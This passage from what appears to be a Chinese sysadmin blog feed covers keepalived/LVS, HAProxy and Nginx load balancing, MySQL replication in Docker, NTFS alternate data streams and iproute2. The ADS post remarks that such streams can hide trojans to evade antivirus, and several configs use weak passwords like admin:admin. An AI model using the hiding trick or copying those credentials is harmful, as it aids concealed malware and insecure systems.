class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs awk">! Configuration File <span class="hljs-keyword">for</span> keepalived<br><br>global_defs &#123;<br>   notification_email &#123;<br>     acassen@firewall.loc<br>     failover@firewall.loc<br>     sysadmin@firewall.loc<br>   &#125;<br>   <span class="hljs-comment">#配置告警发送邮件的邮件服务器相关信息</span><br>   notification_email_from Alexandre.Cassen@firewall.loc<br>   smtp_server <span class="hljs-number">192.168</span>.<span class="hljs-number">200.1</span><br>   smtp_connect_timeout <span class="hljs-number">30</span><br>   router_id LVS_DEVEL<br>   vrrp_skip_check_adv_addr<br>   vrrp_strict<br>   vrrp_iptables <span class="hljs-comment">#取消自动生成iptables规则</span><br>   vrrp_garp_interval <span class="hljs-number">0</span><br>   vrrp_gna_interval <span class="hljs-number">0</span><br>&#125;<br><span class="hljs-comment">#实例</span><br>vrrp_instance VI_1 &#123;<br>    state MASTER<br>    interface ens33<br>    <span class="hljs-comment">#集群id号</span><br>    virtual_router_id <span class="hljs-number">51</span><br>    <span class="hljs-comment">#优先级</span><br>    priority <span class="hljs-number">100</span><br>    advert_int <span class="hljs-number">1</span><br>    <span class="hljs-comment">#验证信息</span><br>    authentication &#123;<br>        auth_type PASS<br>        auth_pass <span class="hljs-number">1111</span><br>    &#125;<br>    <span class="hljs-comment">#虚拟服务器ip地址,便于服务器故障时将虚拟ip地址漂移给其他的从节点</span><br>    virtual_ipaddress &#123;<br>        <span class="hljs-number">192.168</span>.<span class="hljs-number">245.188</span>/<span class="hljs-number">24</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">#虚拟服务器集群(用于vrrp实例调用)</span><br>virtual_server <span class="hljs-number">192.168</span>.<span class="hljs-number">200.100</span> <span class="hljs-number">443</span> &#123;<br>    delay_loop <span class="hljs-number">6</span><br>    lb_algo rr<br>    <span class="hljs-comment">#lvs调度类型</span><br>    lb_kind DR<br>    persistence_timeout <span class="hljs-number">60</span><br>    protocol TCP<br><span class="hljs-comment">#后端服务器的ip和端口号</span><br>    real_server <span class="hljs-number">192.168</span>.<span class="hljs-number">201.100</span> <span class="hljs-number">443</span> &#123;<br>        weight <span class="hljs-number">1</span><br>        <span class="hljs-comment">#健康检查(SSL_GET/TCP/SSL_GET)</span><br>        SSL_GET &#123;<br>            url &#123;<br>              path /<br>              digest ff20ad2481f97b1754ef3e12ecd3a9cc<br>            &#125;<br>            url &#123;<br>              path <span class="hljs-regexp">/mrtg/</span><br>              digest <span class="hljs-number">9</span>b3a0c85a887a256d6939da88aabd8cd <span class="hljs-comment">#返回页面的md5值</span><br>            &#125;<br>            connect_timeout <span class="hljs-number">3</span><br>            nb_get_retry <span class="hljs-number">3</span><br>            delay_before_retry <span class="hljs-number">3</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>virtual_server <span class="hljs-number">10.10</span>.<span class="hljs-number">10.2</span> <span class="hljs-number">1358</span> &#123;<br>    delay_loop <span class="hljs-number">6</span><br>    lb_algo rr <br>    lb_kind NAT<br>    persistence_timeout <span class="hljs-number">50</span><br>    protocol TCP<br><br>    sorry_server <span class="hljs-number">192.168</span>.<span class="hljs-number">200.200</span> <span class="hljs-number">1358</span><br><br>    real_server <span class="hljs-number">192.168</span>.<span class="hljs-number">200.2</span> <span class="hljs-number">1358</span> &#123;<br>        weight <span class="hljs-number">1</span><br>        HTTP_GET &#123;<br>            url &#123; <br>              path <span class="hljs-regexp">/testurl/</span>test.jsp<br>              digest <span class="hljs-number">640205</span>b7b0fc66c1ea91c463fac6334d<br>            &#125;<br>            url &#123; <br>              path <span class="hljs-regexp">/testurl2/</span>test.jsp<br>              digest <span class="hljs-number">640205</span>b7b0fc66c1ea91c463fac6334d<br>            &#125;<br>            url &#123; <br>              path <span class="hljs-regexp">/testurl3/</span>test.jsp<br>              digest <span class="hljs-number">640205</span>b7b0fc66c1ea91c463fac6334d<br>            &#125;<br>            connect_timeout <span class="hljs-number">3</span><br>            nb_get_retry <span class="hljs-number">3</span><br>            delay_before_retry <span class="hljs-number">3</span><br>        &#125;<br>    &#125;<br><br>    real_server <span class="hljs-number">192.168</span>.<span class="hljs-number">200.3</span> <span class="hljs-number">1358</span> &#123;<br>        weight <span class="hljs-number">1</span><br>        HTTP_GET &#123;<br>            url &#123; <br>              path <span class="hljs-regexp">/testurl/</span>test.jsp<br>              digest <span class="hljs-number">640205</span>b7b0fc66c1ea91c463fac6334c<br>            &#125;<br>            url &#123; <br>              path <span class="hljs-regexp">/testurl2/</span>test.jsp<br>              digest <span class="hljs-number">640205</span>b7b0fc66c1ea91c463fac6334c<br>            &#125;<br>            connect_timeout <span class="hljs-number">3</span><br>            nb_get_retry <span class="hljs-number">3</span><br>            delay_before_retry <span class="hljs-number">3</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>virtual_server <span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span> <span class="hljs-number">1358</span> &#123;<br>    delay_loop <span class="hljs-number">3</span><br>    lb_algo rr <br>    lb_kind NAT<br>    persistence_timeout <span class="hljs-number">50</span><br>    protocol TCP<br><br>    real_server <span class="hljs-number">192.168</span>.<span class="hljs-number">200.4</span> <span class="hljs-number">1358</span> &#123;<br>        weight <span class="hljs-number">1</span><br>        HTTP_GET &#123;<br>            url &#123; <br>              path <span class="hljs-regexp">/testurl/</span>test.jsp<br>              digest <span class="hljs-number">640205</span>b7b0fc66c1ea91c463fac6334d<br>            &#125;<br>            url &#123; <br>              path <span class="hljs-regexp">/testurl2/</span>test.jsp<br>              digest <span class="hljs-number">640205</span>b7b0fc66c1ea91c463fac6334d<br>            &#125;<br>            url &#123; <br>              path <span class="hljs-regexp">/testurl3/</span>test.jsp<br>              digest <span class="hljs-number">640205</span>b7b0fc66c1ea91c463fac6334d<br>            &#125;<br>            connect_timeout <span class="hljs-number">3</span><br>            nb_get_retry <span class="hljs-number">3</span><br>            delay_before_retry <span class="hljs-number">3</span><br>        &#125;<br>    &#125;<br><br>    real_server <span class="hljs-number">192.168</span>.<span class="hljs-number">200.5</span> <span class="hljs-number">1358</span> &#123;<br>        weight <span class="hljs-number">1</span><br>        HTTP_GET &#123;<br>            url &#123; <br>              path <span class="hljs-regexp">/testurl/</span>test.jsp<br>              digest <span class="hljs-number">640205</span>b7b0fc66c1ea91c463fac6334d<br>            &#125;<br>            url &#123; <br>              path <span class="hljs-regexp">/testurl2/</span>test.jsp<br>              digest <span class="hljs-number">640205</span>b7b0fc66c1ea91c463fac6334d<br>            &#125;<br>            url &#123; <br>              path <span class="hljs-regexp">/testurl3/</span>test.jsp<br>              digest <span class="hljs-number">640205</span>b7b0fc66c1ea91c463fac6334d<br>            &#125;<br>            connect_timeout <span class="hljs-number">3</span><br>            nb_get_retry <span class="hljs-number">3</span><br>            delay_before_retry <span class="hljs-number">3</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>real server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_announce<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/conf/all/arp_ignore<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_announce<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore<br><span class="hljs-comment">#添加虚拟ip地址s</span><br>ip addr add <span class="hljs-variable">$VIP</span>/PREFIX dev lo label lo:1<br></code></pre></td></tr></table></figure><p>调度器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#添加虚拟ip地址</span><br>ip addr add <span class="hljs-variable">$VIP</span>/PREFIX dev ens33 label ens33:1<br><span class="hljs-comment">#配置路由</span><br>ip route add <span class="hljs-variable">$VIP</span> dev ens33 ens33:1<br></code></pre></td></tr></table></figure><h3 id="2-Haproxy"><a href="#2-Haproxy" class="headerlink" title="2.Haproxy"></a>2.Haproxy</h3><h4 id="2-1-Haproxy是什么？"><a href="#2-1-Haproxy是什么？" class="headerlink" title="2.1.Haproxy是什么？"></a>2.1.Haproxy是什么？</h4><p>Haproxy是一款提供高可用性,基于4层和7层负载均衡的专业应用代理服务器。</p><h4 id="2-2-Haproxy的功能"><a href="#2-2-Haproxy的功能" class="headerlink" title="2.2.Haproxy的功能"></a>2.2.Haproxy的功能</h4><ul><li><p>负载均衡</p><p>基于L4和L7负载均衡,支持多种负载均衡算法</p></li><li><p>健康检查</p><p>支持TCP和HTTP两种健康检查模式</p></li><li><p>会话保持</p><p>对于未实现会话共享的应用集群，可通过Insert Cookie&#x2F;Rewrite Cookie&#x2F;Prefix Cookie，以及上述的多种Hash方式实现会话保持</p></li><li><p>监控与统计</p><p>HAProxy提供了基于Web的统计信息页面，展现健康状态和流量数据。基于此功能，使用者可以开发监控程序来监控HAProxy的状态</p></li></ul><h4 id="2-3-Haproxy配置"><a href="#2-3-Haproxy配置" class="headerlink" title="2.3.Haproxy配置"></a>2.3.Haproxy配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">global<br><span class="hljs-built_in">log</span> /dev/loglocal0<br><span class="hljs-built_in">log</span> /dev/loglocal1 notice<br><span class="hljs-built_in">chroot</span> /var/lib/haproxy<br>stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners<br>stats <span class="hljs-built_in">timeout</span> 30s<br>user haproxy<br>group haproxy<br>daemon<br><br><span class="hljs-comment"># Default SSL material locations</span><br>ca-base /etc/ssl/certs<br>crt-base /etc/ssl/private<br><br><span class="hljs-comment"># See: https://ssl-config.mozilla.org/#server=haproxy&amp;server-version=2.0.3&amp;config=intermediate</span><br>    ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384<br>    ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256<br>    ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets<br><br>defaults<br><span class="hljs-built_in">log</span>global<br>modehttp<br>optionhttplog<br>optiondontlognull<br>        <span class="hljs-built_in">timeout</span> connect 5000<br>        <span class="hljs-built_in">timeout</span> client  50000<br>        <span class="hljs-built_in">timeout</span> server  50000<br>errorfile 400 /etc/haproxy/errors/400.http<br>errorfile 403 /etc/haproxy/errors/403.http<br>errorfile 408 /etc/haproxy/errors/408.http<br>errorfile 500 /etc/haproxy/errors/500.http<br>errorfile 502 /etc/haproxy/errors/502.http<br>errorfile 503 /etc/haproxy/errors/503.http<br>errorfile 504 /etc/haproxy/errors/504.http<br>frontend app<span class="hljs-comment">#前端请求分发器</span><br><span class="hljs-built_in">bind</span> *:8080<br>mode http<br>default_backend servers<br>backend servers<span class="hljs-comment">#后端真实服务器</span><br>server 192.168.0.2 192.168.0.2:80 check maxconn 2000<span class="hljs-comment">#check可以在服务器宕机的时候不再将请求分发给宕机服务器</span><br>server 192.168.0.2 192.168.0.2:81 check maxconn 2000<br>listen admin_stats <span class="hljs-comment">#配置可视化面板</span><br><span class="hljs-built_in">bind</span> *:8081<br>mode http<br>option httplog<br>stats refresh 4s<br>stats uri /dashboard<br>stats auth admin:admin<br><br></code></pre></td></tr></table></figure><p>启动haproxy服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl restart haproxy<br></code></pre></td></tr></table></figure><h3 id="3-Nginx"><a href="#3-Nginx" class="headerlink" title="3.Nginx"></a>3.Nginx</h3><h4 id="3-1-什么是Nginx"><a href="#3-1-什么是Nginx" class="headerlink" title="3.1.什么是Nginx?"></a>3.1.什么是Nginx?</h4><p>Nginx是一个高性能的web服务器和反向代理服务器</p><h4 id="3-2-Nginx配置负载均衡"><a href="#3-2-Nginx配置负载均衡" class="headerlink" title="3.2.Nginx配置负载均衡"></a>3.2.Nginx配置负载均衡</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">upstream server &#123; <br>      server 127.0.0.1:80; <br>      server 127.0.0.1:81; <br>&#125;<span class="hljs-comment">#配置上游服务器(默认调度算法为轮询)</span><br>localtion /&#123;<br><span class="hljs-comment">#配置后端实际处理请求的服务器</span><br>proxy_pass http://server;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考:</p><p><a href="https://zhuanlan.zhihu.com/p/359918708">https://zhuanlan.zhihu.com/p/359918708</a></p>]]></content>
    
    
    <categories>
      
      <category>linux运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql主从复制</title>
    <link href="/2022/08/19/mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/08/19/mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="mysql主从复制"><a href="#mysql主从复制" class="headerlink" title="mysql主从复制"></a>mysql主从复制</h1><h3 id="1-mysql主从复制的原理"><a href="#1-mysql主从复制的原理" class="headerlink" title="1.mysql主从复制的原理"></a>1.mysql主从复制的原理</h3><ul><li>1.mysql主库将数据的更改记录记录到二进制日志(binary log)中</li><li>2.mysql从库将主库的更改记录的二进制日志同步到本地的中继日志(relay log)</li><li>3.mysql从库读取中继日志,根据日志中的操作步骤,同步数据</li></ul><h3 id="2-mysql主从复制的搭建"><a href="#2-mysql主从复制的搭建" class="headerlink" title="2.mysql主从复制的搭建"></a>2.mysql主从复制的搭建</h3><p>1.使用docker启动两个mysql容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -d --name mysql_master -p3306:3306 -e MYSQL_ROOT_PASSWORD=<span class="hljs-string">&#x27;root&#x27;</span> -v mysql_master_config:/etc mysql<br>docker run -d --name mysql_slave -p3307:3306 -e MYSQL_ROOT_PASSWORD=<span class="hljs-string">&#x27;root&#x27;</span> -v mysql_slave_config:/etc mysql<br></code></pre></td></tr></table></figure><p>2.修改主库和从库的配置文件</p><ul><li>修改mysql_master配置文件</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[mysqld]<br><span class="hljs-attribute">server-id</span>=1<br><span class="hljs-attribute">log-bin</span>=localhost-binlog#日志文件<br><br><span class="hljs-comment">#需要同步的表，不配置默认同步所有数据库</span><br><span class="hljs-attribute">binlog-do-db</span>=db_a<br><span class="hljs-attribute">binlog-do-db</span>=db_b<br><span class="hljs-attribute">binlog-do-db</span>=db_c<br><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><br></code></pre></td></tr></table></figure><ul><li>修改mysql_slave配置文件</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">[mysqld]<br><span class="hljs-attribute">server-id</span><span class="hljs-operator">=</span><span class="hljs-number">2</span><br>......<br></code></pre></td></tr></table></figure><p>3.mysql主库配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">alter user <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified with mysql_native_password by <span class="hljs-string">&#x27;root&#x27;</span>;<br><br><span class="hljs-comment">#登录mysql数据库</span><br>mysql -h 127.0.0.1 -uroot -proot<br><br><span class="hljs-comment">#创建一个主从复制用户</span><br>create user slave@<span class="hljs-string">&#x27;%&#x27;</span> identified with mysql_native_password by <span class="hljs-string">&#x27;slave&#x27;</span>;<br><br><span class="hljs-comment">#赋予复制用户的读取权限</span><br>grant replication slave,replication client on *.* to slave@<span class="hljs-string">&#x27;%&#x27;</span>;<br></code></pre></td></tr></table></figure><p>配置从机</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">#修改验证方式<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">with</span> mysql_native_password <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;root&#x27;</span>;<br><br>#配置主库的相关配置<br>change master <span class="hljs-keyword">to</span> <br>master_host<span class="hljs-operator">=</span><span class="hljs-string">&#x27;172.17.0.4&#x27;</span>,<br>master_port<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>master_user<span class="hljs-operator">=</span><span class="hljs-string">&#x27;slave&#x27;</span>,<br>master_password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;slave&#x27;</span>,<br>master_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;logbin.000002&#x27;</span>,<br>master_log_pos<span class="hljs-operator">=</span><span class="hljs-number">1825</span>;#这个参数可以由主库<span class="hljs-keyword">show</span> master status得到<br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment">#开启备份</span><br><span class="hljs-literal">start</span> <span class="hljs-literal">slave</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ads文件</title>
    <link href="/2022/08/13/ads%E6%96%87%E4%BB%B6/"/>
    <url>/2022/08/13/ads%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="ads文件"><a href="#ads文件" class="headerlink" title="ads文件"></a>ads文件</h1><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念:"></a>基本概念:</h3><p>NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在<a href="https://baike.baidu.com/item/NTFS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/2152677">NTFS文件系统</a>下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。下面通过一个实例来具体展现ADS流文件的创建、关联及隐藏过程。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>在ntfs文件系统分区创建ads文件流有两种方式,一个是指在指定宿主文件的情况下创建ads文件流,二是创建一个单独的ads文件流,ads文件不能直接查看到,可以使用dir &#x2F;r命令查看,后缀带有$DATA的文件就是ads文件,ads文件不能直接使用type进行查看,可以使用notepad进行打开编辑</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> hello &gt; hello.txt:ads.txt <span class="hljs-comment">#以文件ads.txt为宿主文件,创建了ads文件ads.txt</span><br><span class="hljs-built_in">echo</span> hello &gt; :ads.txt <span class="hljs-comment">#创建一个没有宿主文件的单独ads文件(依赖于所在目录),(如果该文件在根分区目录下,只能借助第三方工具将其删除)</span><br></code></pre></td></tr></table></figure><p>可以通过使用ads文件隐藏木马,起到免杀的作用</p><h3 id="移除ads文件的方法"><a href="#移除ads文件的方法" class="headerlink" title="移除ads文件的方法"></a>移除ads文件的方法</h3><p>1.删除顶层目录</p><p>2.删除宿主文件</p><p>3.将文件移动到非ntfs分区</p><p>4.借助第三方软件将ads文件删除</p>]]></content>
    
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iproute2的基本使用</title>
    <link href="/2022/08/11/iproute2%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/11/iproute2%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="iproute2的基本使用"><a href="#iproute2的基本使用" class="headerlink" title="iproute2的基本使用"></a>iproute2的基本使用</h1><h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h3><h4 id="1-查看指定网卡的信息"><a href="#1-查看指定网卡的信息" class="headerlink" title="1.查看指定网卡的信息"></a>1.查看指定网卡的信息</h4><p>配置链路信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip <span class="hljs-built_in">link</span> show eth0 <span class="hljs-comment">#查看网卡的链路信息</span><br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> eth0 up/down <span class="hljs-comment">#设置网卡启动或者关闭</span><br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> eth1 multicast on/off<span class="hljs-comment">#打开/关闭网络接口的多播标志</span><br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> eth1 mtu 1500<span class="hljs-comment">#设置mtu值</span><br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> eth1 txqueuelen 1000<br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> eth1 name eth10<span class="hljs-comment">#修改网卡标志</span><br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> eth1 arp on<span class="hljs-comment">#修改关联的arp标志</span><br></code></pre></td></tr></table></figure><p>配置ip地址信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip addr show eth0 <span class="hljs-comment">#查看网卡的ip地址</span><br>ip addr add/del/change ipaddress/netprefix dev interface <span class="hljs-comment">#添加/删除/修改 网卡的ip地址</span><br><br></code></pre></td></tr></table></figure><p>配置路由信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip route add ipaddr/netmask via ipaddr dev eth0<span class="hljs-comment">#配置路由</span><br></code></pre></td></tr></table></figure><p>配置网卡子接口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip addr add IPADDRESS/PREFIX dev eth0 lable eth0:1 <span class="hljs-comment">#配置网卡子接口常用于单臂路由</span><br></code></pre></td></tr></table></figure><p>配置策略路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 配置默认路由</span><br>ip route add default via 192.168.0.1<br><span class="hljs-comment"># 添加新路由表 out3</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;3 out3&quot;</span> &gt;&gt; /etc/iproute2/rt_tables<br><span class="hljs-comment"># 给 out3 路由表添加默认路由</span><br>ip route add default via 192.168.0.3 table out3<br><span class="hljs-comment"># 用 iptables 给访问 tcp 80 端口的数据打标</span><br>iptables -t mangle -A OUTPUT -p tcp --dport 80 -j MARK --set-mark 3<br><span class="hljs-comment"># 将打标数据与 out3 路由表关联</span><br>ip rule add fwmark 3 table out3  